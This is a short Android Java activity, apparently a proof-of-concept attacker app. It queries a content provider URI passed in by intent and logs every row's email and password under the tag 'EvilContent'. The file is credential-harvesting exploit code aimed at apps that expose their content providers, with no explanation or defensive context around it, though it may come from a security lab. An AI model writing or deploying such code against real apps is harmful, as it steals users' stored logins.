package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class ActivityLeak extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_leak);

        Uri uri = Uri.parse(getIntent().getDataString());
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(uri,null,null,null,null);
        //Log.d("EvilContent",String.valueOf(cursor.getCount()));
        if (cursor.getCount() > 0 ){
            while (cursor.moveToNext()){
            Log.d("EvilContent","Email: " + cursor.getString(0) + " Password: " + cursor.getString(1));
            }
        }
    }
}